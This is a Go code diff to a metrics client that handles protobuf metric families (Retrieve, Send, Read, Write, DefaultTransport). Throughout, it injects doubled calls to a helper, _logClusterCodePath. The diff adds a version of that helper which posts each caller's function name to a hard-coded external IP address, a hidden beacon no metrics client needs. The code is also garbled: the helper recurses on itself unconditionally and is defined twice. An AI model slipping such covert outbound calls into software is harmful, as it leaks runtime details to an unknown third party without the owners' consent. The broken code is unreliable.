@@ -30,6 +30,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prometheus.MustRegister(gaugeRequestRetrieve, gaugeRequestSend)
 }
 
@@ -43,9 +45,13 @@ type Client struct {
 func New(client *http.Client, maxBytes int64, timeout time.Duration, metricsName string) *Client {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Client{client: client, maxBytes: maxBytes, timeout: timeout, metricsName: metricsName}
 }
 func (c *Client) Retrieve(ctx context.Context, req *http.Request) ([]*clientmodel.MetricFamily, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if req.Header == nil {
@@ -96,6 +102,8 @@ func (c *Client) Retrieve(ctx context.Context, req *http.Request) ([]*clientmode
 func (c *Client) Send(ctx context.Context, req *http.Request, families []*clientmodel.MetricFamily) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	buf := &bytes.Buffer{}
 	if err := Write(buf, families); err != nil {
 		return err
@@ -142,6 +150,8 @@ func (c *Client) Send(ctx context.Context, req *http.Request, families []*client
 func Read(r io.Reader) ([]*clientmodel.MetricFamily, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	decompress := snappy.NewReader(r)
 	decoder := expfmt.NewDecoder(decompress, expfmt.FmtProtoDelim)
 	families := make([]*clientmodel.MetricFamily, 0, 100)
@@ -160,6 +170,8 @@ func Read(r io.Reader) ([]*clientmodel.MetricFamily, error) {
 func Write(w io.Writer, families []*clientmodel.MetricFamily) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	compress := snappy.NewBufferedWriter(w)
 	encoder := expfmt.NewEncoder(compress, expfmt.FmtProtoDelim)
 	for _, family := range families {
@@ -176,6 +188,8 @@ func Write(w io.Writer, families []*clientmodel.MetricFamily) error {
 	return nil
 }
 func withCancel(ctx context.Context, client *http.Client, req *http.Request, fn func(*http.Response) error) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resp, err := client.Do(req)
@@ -206,12 +220,23 @@ func withCancel(ctx context.Context, client *http.Client, req *http.Request, fn 
 func DefaultTransport() *http.Transport {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &http.Transport{Proxy: http.ProxyFromEnvironment, Dial: (&net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}).Dial, TLSHandshakeTimeout: 10 * time.Second, DisableKeepAlives: true}
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
